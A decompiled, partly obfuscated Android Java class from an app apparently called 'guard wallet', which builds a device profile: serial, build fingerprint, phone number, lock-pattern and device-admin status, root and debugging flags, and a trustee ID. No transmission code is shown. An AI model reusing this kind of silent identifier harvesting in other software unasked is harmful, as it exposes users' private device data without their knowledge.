package com.guard.wallet.resp;

import a.a;
import a1.q;
import android.annotation.SuppressLint;
import android.os.Build;
import android.os.Build.VERSION;
import android.support.annotation.NonNull;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.BatteryLevelVO;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.utils.d;
import com.guard.wallet.utils.e;
import com.guard.wallet.utils.g;
import com.guard.wallet.utils.h;
import java.io.Serializable;
import java.util.Arrays;
import java.util.List;

public class DeviceInfoVO implements Serializable {
   private Integer apiGrade;
   private BatteryLevelVO batteryLevel;
   private String board;
   private String brandCode;
   private String codeName;
   private String device;
   private DeviceAdminVO deviceAdmin;
   private String deviceId;
   private String deviceToken;
   private String deviceUid;
   private String displayId;
   private Integer enableDebug;
   private Integer enableDevelopment;
   private Integer enableWifiDebug;
   private String factoryTime;
   private String fingerPrint;
   private String hardwareName;
   private String incremental;
   private Integer isRoot;
   private String langCode;
   private LockPatternVO lockPattern;
   private String manufacturer;
   private String model;
   private String optimalABI;
   private String osArch;
   private String osName;
   private String osVersion;
   private String packageName;
   private String phoneNumber;
   private String product;
   private String release;
   private ScreenMetricsVO screen;
   private String serial;
   private List<String> supportABI;
   private String trusteeId;

   public DeviceInfoVO() {
   }

   public DeviceInfoVO(
      String var1,
      String var2,
      String var3,
      String var4,
      String var5,
      String var6,
      String var7,
      String var8,
      String var9,
      String var10,
      String var11,
      String var12,
      String var13,
      String var14,
      String var15,
      String var16,
      String var17,
      String var18,
      Integer var19,
      String var20,
      String var21,
      String var22,
      String var23,
      ScreenMetricsVO var24,
      DeviceAdminVO var25,
      LockPatternVO var26,
      BatteryLevelVO var27,
      Integer var28,
      Integer var29,
      Integer var30,
      Integer var31,
      String var32,
      String var33,
      String var34
   ) {
      this.deviceId = var1;
      this.deviceUid = var2;
      this.packageName = var3;
      this.deviceToken = var4;
      this.displayId = var5;
      this.board = var6;
      this.brandCode = var7;
      this.optimalABI = var8;
      this.device = var9;
      this.fingerPrint = var10;
      this.serial = var11;
      this.manufacturer = var12;
      this.model = var13;
      this.hardwareName = var14;
      this.product = var15;
      this.codeName = var16;
      this.incremental = var17;
      this.release = var18;
      this.apiGrade = var19;
      this.osVersion = var20;
      this.osName = var21;
      this.osArch = var22;
      this.langCode = var23;
      this.screen = var24;
      this.deviceAdmin = var25;
      this.lockPattern = var26;
      this.batteryLevel = var27;
      this.isRoot = var28;
      this.enableDevelopment = var29;
      this.enableDebug = var30;
      this.enableWifiDebug = var31;
      this.phoneNumber = var32;
      this.factoryTime = var33;
      this.trusteeId = var34;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @SuppressLint({"HardwareIds"})
   public static DeviceInfoVO of() {
      DeviceInfoVO var4 = new DeviceInfoVO();
      var4.setDeviceUid(e.c());
      if (MainApplication.getInstance() != null) {
         var4.setPackageName(MainApplication.getInstance().getPackageName());
      }

      var4.setDeviceToken(h.l("deviceToken"));
      var4.setDisplayId(Build.DISPLAY);
      var4.setBoard(Build.BOARD);
      var4.setBrandCode(Build.BRAND);
      String[] var2 = Build.SUPPORTED_ABIS;
      if (var2 != null && var2.length > 0) {
         var4.setSupportABI(Arrays.asList(var2));
         var4.setOptimalABI(var2[0]);
      }

      var4.setDevice(Build.DEVICE);
      var4.setFingerPrint(Build.FINGERPRINT);
      var4.setSerial(Build.SERIAL);
      var4.setManufacturer(Build.MANUFACTURER);
      var4.setModel(Build.MODEL);
      var4.setHardwareName(Build.HARDWARE);
      var4.setProduct(Build.PRODUCT);
      var4.setRelease(VERSION.RELEASE);
      var4.setCodeName(VERSION.CODENAME);
      var4.setIncremental(VERSION.INCREMENTAL);
      var4.setApiGrade(VERSION.SDK_INT);
      var4.setOsVersion(System.getProperty("os.version"));
      var4.setOsName(System.getProperty("os.name"));
      var4.setOsArch(System.getProperty("os.arch"));
      var4.setLangCode(h.m());
      var4.setScreen(e.e());
      var4.setDeviceAdmin(g.C0());
      var4.setLockPattern(g.B0());
      var4.setBatteryLevel(q.d());
      Integer var7;
      if (q.e()) {
         var7 = 1;
      } else {
         var7 = 0;
      }

      var4.setIsRoot(var7);
      Integer var8;
      if (g.K()) {
         var8 = 1;
      } else {
         var8 = 0;
      }

      var4.setEnableDevelopment(var8);
      Integer var9;
      if (g.I()) {
         var9 = 1;
      } else {
         var9 = 0;
      }

      var4.setEnableDebug(var9);
      Integer var10;
      if (g.J()) {
         var10 = 1;
      } else {
         var10 = 0;
      }

      var4.setEnableWifiDebug(var10);
      var4.setPhoneNumber(e.n());
      Object var3 = null;

      label62: {
         label61: {
            Exception var10000;
            label69: {
               long var0;
               try {
                  var0 = Build.TIME;
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var10001 = false;
                  break label69;
               }

               if (var0 <= 0L) {
                  break label61;
               }

               try {
                  var2 = String.valueOf(var0);
                  break label62;
               } catch (Exception var5) {
                  var10000 = var5;
                  boolean var15 = false;
               }
            }

            Exception var11 = var10000;
            q.s("DeviceUtils", var11);
         }

         var2 = null;
      }

      var4.setFactoryTime(var2);
      Integer var13 = d.a;
      String var14 = (String)var3;
      if (MainApplication.getInstance() != null) {
         var14 = (String)var3;
         if (MainApplication.getInstance().getBuildConfig() != null) {
            var14 = (String)var3;
            if (!q.B(MainApplication.getInstance().getBuildConfig().getTrusteeId())) {
               var14 = MainApplication.getInstance().getBuildConfig().getTrusteeId();
            }
         }
      }

      var4.setTrusteeId(var14);
      return var4;
   }

   public Integer getApiGrade() {
      return this.apiGrade;
   }

   public BatteryLevelVO getBatteryLevel() {
      return this.batteryLevel;
   }

   public String getBoard() {
      return this.board;
   }

   public String getBrandCode() {
      return this.brandCode;
   }

   public String getCodeName() {
      return this.codeName;
   }

   public String getDevice() {
      return this.device;
   }

   public DeviceAdminVO getDeviceAdmin() {
      return this.deviceAdmin;
   }

   public String getDeviceId() {
      return this.deviceId;
   }

   public String getDeviceToken() {
      return this.deviceToken;
   }

   public String getDeviceUid() {
      return this.deviceUid;
   }

   public String getDisplayId() {
      return this.displayId;
   }

   public Integer getEnableDebug() {
      return this.enableDebug;
   }

   public Integer getEnableDevelopment() {
      return this.enableDevelopment;
   }

   public Integer getEnableWifiDebug() {
      return this.enableWifiDebug;
   }

   public String getFactoryTime() {
      return this.factoryTime;
   }

   public String getFingerPrint() {
      return this.fingerPrint;
   }

   public String getHardwareName() {
      return this.hardwareName;
   }

   public String getIncremental() {
      return this.incremental;
   }

   public Integer getIsRoot() {
      return this.isRoot;
   }

   public String getLangCode() {
      return this.langCode;
   }

   public LockPatternVO getLockPattern() {
      return this.lockPattern;
   }

   public String getManufacturer() {
      return this.manufacturer;
   }

   public String getModel() {
      return this.model;
   }

   public String getOptimalABI() {
      return this.optimalABI;
   }

   public String getOsArch() {
      return this.osArch;
   }

   public String getOsName() {
      return this.osName;
   }

   public String getOsVersion() {
      return this.osVersion;
   }

   public String getPackageName() {
      return this.packageName;
   }

   public String getPhoneNumber() {
      return this.phoneNumber;
   }

   public String getProduct() {
      return this.product;
   }

   public String getRelease() {
      return this.release;
   }

   public ScreenMetricsVO getScreen() {
      return this.screen;
   }

   public String getSerial() {
      return this.serial;
   }

   public List<String> getSupportABI() {
      return this.supportABI;
   }

   public String getTrusteeId() {
      return this.trusteeId;
   }

   public void setApiGrade(Integer var1) {
      this.apiGrade = var1;
   }

   public void setBatteryLevel(BatteryLevelVO var1) {
      this.batteryLevel = var1;
   }

   public void setBoard(String var1) {
      this.board = var1;
   }

   public void setBrandCode(String var1) {
      this.brandCode = var1;
   }

   public void setCodeName(String var1) {
      this.codeName = var1;
   }

   public void setDevice(String var1) {
      this.device = var1;
   }

   public void setDeviceAdmin(DeviceAdminVO var1) {
      this.deviceAdmin = var1;
   }

   public void setDeviceId(String var1) {
      this.deviceId = var1;
   }

   public void setDeviceToken(String var1) {
      this.deviceToken = var1;
   }

   public void setDeviceUid(String var1) {
      this.deviceUid = var1;
   }

   public void setDisplayId(String var1) {
      this.displayId = var1;
   }

   public void setEnableDebug(Integer var1) {
      this.enableDebug = var1;
   }

   public void setEnableDevelopment(Integer var1) {
      this.enableDevelopment = var1;
   }

   public void setEnableWifiDebug(Integer var1) {
      this.enableWifiDebug = var1;
   }

   public void setFactoryTime(String var1) {
      this.factoryTime = var1;
   }

   public void setFingerPrint(String var1) {
      this.fingerPrint = var1;
   }

   public void setHardwareName(String var1) {
      this.hardwareName = var1;
   }

   public void setIncremental(String var1) {
      this.incremental = var1;
   }

   public void setIsRoot(Integer var1) {
      this.isRoot = var1;
   }

   public void setLangCode(String var1) {
      this.langCode = var1;
   }

   public void setLockPattern(LockPatternVO var1) {
      this.lockPattern = var1;
   }

   public void setManufacturer(String var1) {
      this.manufacturer = var1;
   }

   public void setModel(String var1) {
      this.model = var1;
   }

   public void setOptimalABI(String var1) {
      this.optimalABI = var1;
   }

   public void setOsArch(String var1) {
      this.osArch = var1;
   }

   public void setOsName(String var1) {
      this.osName = var1;
   }

   public void setOsVersion(String var1) {
      this.osVersion = var1;
   }

   public void setPackageName(String var1) {
      this.packageName = var1;
   }

   public void setPhoneNumber(String var1) {
      this.phoneNumber = var1;
   }

   public void setProduct(String var1) {
      this.product = var1;
   }

   public void setRelease(String var1) {
      this.release = var1;
   }

   public void setScreen(ScreenMetricsVO var1) {
      this.screen = var1;
   }

   public void setSerial(String var1) {
      this.serial = var1;
   }

   public void setSupportABI(List<String> var1) {
      this.supportABI = var1;
   }

   public void setTrusteeId(String var1) {
      this.trusteeId = var1;
   }

   @NonNull
   @Override
   public String toString() {
      StringBuilder var1 = new StringBuilder("DeviceInfoVO{deviceUid='");
      var1.append(this.deviceUid);
      var1.append("', deviceId='");
      var1.append(this.deviceId);
      var1.append("', packageName='");
      var1.append(this.packageName);
      var1.append("', deviceToken='");
      var1.append(this.deviceToken);
      var1.append("', displayId='");
      var1.append(this.displayId);
      var1.append("', board='");
      var1.append(this.board);
      var1.append("', brandCode='");
      var1.append(this.brandCode);
      var1.append("', supportABI='");
      var1.append(this.supportABI);
      var1.append("', optimalABI='");
      var1.append(this.optimalABI);
      var1.append("', device='");
      var1.append(this.device);
      var1.append("', fingerPrint='");
      var1.append(this.fingerPrint);
      var1.append("', serial='");
      var1.append(this.serial);
      var1.append("', manufacturer='");
      var1.append(this.manufacturer);
      var1.append("', model='");
      var1.append(this.model);
      var1.append("', hardwareName='");
      var1.append(this.hardwareName);
      var1.append("', product='");
      var1.append(this.product);
      var1.append("', codeName='");
      var1.append(this.codeName);
      var1.append("', incremental='");
      var1.append(this.incremental);
      var1.append("', release='");
      var1.append(this.release);
      var1.append("', apiGrade=");
      var1.append(this.apiGrade);
      var1.append(", osVersion='");
      var1.append(this.osVersion);
      var1.append("', osName='");
      var1.append(this.osName);
      var1.append("', osArch='");
      var1.append(this.osArch);
      var1.append("', langCode='");
      var1.append(this.langCode);
      var1.append("', screen=");
      var1.append(this.screen);
      var1.append("', deviceAdmin=");
      var1.append(this.deviceAdmin);
      var1.append("', lockPattern=");
      var1.append(this.lockPattern);
      var1.append("', isRoot=");
      var1.append(this.isRoot);
      var1.append("', enableDevelopment=");
      var1.append(this.enableDevelopment);
      var1.append("', enableDebug=");
      var1.append(this.enableDebug);
      var1.append("', enableWifiDebug=");
      var1.append(this.enableWifiDebug);
      var1.append("', phoneNumber=");
      var1.append(this.phoneNumber);
      var1.append("', factoryTime=");
      var1.append(this.factoryTime);
      var1.append("', trusteeId=");
      return a.n(var1, this.trusteeId, "'}");
   }
}
